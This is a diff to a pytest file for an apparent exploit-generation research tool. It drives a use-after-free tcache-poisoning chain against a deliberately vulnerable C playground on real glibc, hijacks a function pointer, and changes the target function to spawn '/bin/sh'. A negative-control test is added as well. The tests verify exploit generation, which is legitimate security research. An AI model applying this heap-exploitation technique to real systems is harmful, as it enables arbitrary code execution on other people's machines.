@@ -5,10 +5,11 @@ import os
 import re
 import select
 import subprocess
+import time
 
 import pytest
 from lykos.analyze.dynamic import sandbox
-from lykos.analyze.poc import heap
+from lykos.analyze.poc import attribution, heap
 from lykos.analyze.poc.aaheg import Env, Goal, Vuln, plan_exploit
 
 # playground: tcache alloc/free/UAF-write + a global function pointer `fp` and a `c`all of it.
@@ -17,7 +18,7 @@ _PLAY = r"""
 #include <stdlib.h>
 #include <unistd.h>
 static void* chunks[64];
-void win(void){ puts("AAHEG-PWNED"); fflush(stdout); _exit(42); }
+void win(void){ system("/bin/sh"); _exit(42); }   /* a real shell, not a banner: oracle-confirmed */
 void (*fp)(void) __attribute__((aligned(16))) = 0;
 int main(void){
   setvbuf(stdout,NULL,_IONBF,0);
@@ -98,29 +99,72 @@ def _drive(p, data):
     return out.decode("latin-1", "ignore")
 
 
-def test_aaheg_chain_hijacks_control_flow_on_real_glibc(aaheg_bin):
-    """Generate the UAF->tcache-poison->overwrite-fp->call chain and drive it against real
-    glibc; the function pointer is hijacked to win() (observed by its marker)."""
-    p = subprocess.Popen([str(aaheg_bin)], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+def _drive_tcache_hijack(p, *, overwrite=True):
+    """Drive the aaheg UAF->tcache-poison->overwrite-fp chain on the playground, then trigger the
+    call. When overwrite=False (the negative control) the fp cell is written with a wrong value, so
+    the call does NOT reach win(); everything else (poison, alloc-over-fp) stays identical.
+    """
+    banner = _drive(p, b"")
+    fp = int(re.search(r"fp=0x([0-9a-f]+)", banner).group(1), 16)
+    win = int(re.search(r"win=0x([0-9a-f]+)", banner).group(1), 16)
+    plan = plan_exploit(Vuln("uaf", 24),
+                        Goal("control_flow", target=fp, value=win, trigger="call fp"),
+                        Env(glibc=(2, 42)))
+    assert plan["ok"]
+    a0 = int(re.search(r"alloc\[0\]=0x([0-9a-f]+)", _drive(p, b"a 24 0\n")).group(1), 16)
+    forged = plan["mangle"](a0, fp)                    # write_fd value from the plan
+    _drive(p, b"a 24 1\nf 1\nf 0\n")                   # alloc B; free B; free A (LIFO head=A)
+    _drive(p, ("w 0 %x\n" % forged).encode())          # write_fd: forge A.fd -> fp
+    out = _drive(p, b"a 24 2\na 24 3\n")               # alloc (->A); alloc OUT (-> fp)
+    assert int(re.search(r"alloc\[3\]=0x([0-9a-f]+)", out).group(1), 16) == fp
+    value = win if overwrite else (win ^ 0xdead)       # the one difference: the value written to fp
+    _drive(p, ("w 3 %x\n" % value).encode())           # write OUT=win (or a wrong value); then...
+    return _drive(p, b"c\n")                            # trigger: call fp
+
+
+def test_aaheg_chain_hijacks_control_flow_to_a_shell_on_real_glibc(aaheg_bin):
+    """Live-fire the generated UAF->tcache-poison->overwrite-fp chain against real glibc, then PROVE
+    it under the oracle: the hijacked fp calls win(), which system("/bin/sh")s, and the shell
+    EVALUATES a forgery-proof marker (arithmetic + quote-strip). That is real code execution, not a
+    reflected banner -- the heap technique is confirmed to the same standard as the ROP paths."""
+    p = subprocess.Popen([str(aaheg_bin)], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                         stderr=subprocess.STDOUT)
+    markers = attribution.make_code_markers()
     try:
-        banner = _drive(p, b"")
-        fp = int(re.search(r"fp=0x([0-9a-f]+)", banner).group(1), 16)
-        win = int(re.search(r"win=0x([0-9a-f]+)", banner).group(1), 16)
-        plan = plan_exploit(Vuln("uaf", 24),
-                            Goal("control_flow", target=fp, value=win, trigger="call fp"),
-                            Env(glibc=(2, 42)))
-        assert plan["ok"]
-        # map the abstract chain onto the playground's interface (analyst-in-the-loop step)
-        a0 = int(re.search(r"alloc\[0\]=0x([0-9a-f]+)", _drive(p, b"a 24 0\n")).group(1), 16)
-        forged = plan["mangle"](a0, fp)                # write_fd value from the plan
-        _drive(p, b"a 24 1\nf 1\nf 0\n")               # alloc B; free B; free A (LIFO head=A)
-        _drive(p, ("w 0 %x\n" % forged).encode())      # write_fd: forge A.fd -> fp
-        out = _drive(p, b"a 24 2\na 24 3\n")           # alloc (->A); alloc OUT (-> fp)
-        assert int(re.search(r"alloc\[3\]=0x([0-9a-f]+)", out).group(1), 16) == fp
-        res = _drive(p, ("w 3 %x\nc\n" % win).encode())  # write OUT=win; trigger (call fp)
-        assert "AAHEG-PWNED" in res                    # control-flow hijacked to win()
+        _drive_tcache_hijack(p, overwrite=True)        # fp -> win() -> system("/bin/sh")
+        time.sleep(0.3)
+        out = _drive(p, markers.command + b"\n").encode("latin-1", "ignore")
+        assert markers.proves(out), f"no shell from the heap hijack (got {out[:120]!r})"
     finally:
-        for s in (p.stdin, p.stdout):                  # win() _exit()s the process mid-chain
+        for s in (p.stdin, p.stdout):
+            try:
+                s.close()
+            except (BrokenPipeError, OSError):
+                pass
+        try:
+            p.kill(); p.wait(timeout=3)
+        except Exception:
+            pass
+
+
+def test_aaheg_chain_declines_when_the_fp_write_is_wrong(aaheg_bin):
+    """Negative control (supwngo _90_neg): the SAME chain, but the value written into the hijacked
+    fp cell is wrong, so the call does not reach win() and no shell spawns. Byte-identical driving
+    but for that one written value, so the absence of a shell is attributable to it alone -- a shell
+    here would mean the confirmation credited something other than a correct fp overwrite."""
+    p = subprocess.Popen([str(aaheg_bin)], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                         stderr=subprocess.STDOUT)
+    markers = attribution.make_code_markers()
+    try:
+        _drive_tcache_hijack(p, overwrite=False)       # fp written with a WRONG value
+        time.sleep(0.3)
+        try:                                           # the bad fp typically crashes the call...
+            out = _drive(p, markers.command + b"\n").encode("latin-1", "ignore")
+        except (BrokenPipeError, OSError):
+            out = b""                                  # ...a dead process is itself "no shell"
+        assert not markers.proves(out), "a wrong fp value wrongly produced a shell"
+    finally:
+        for s in (p.stdin, p.stdout):
             try:
                 s.close()
             except (BrokenPipeError, OSError):
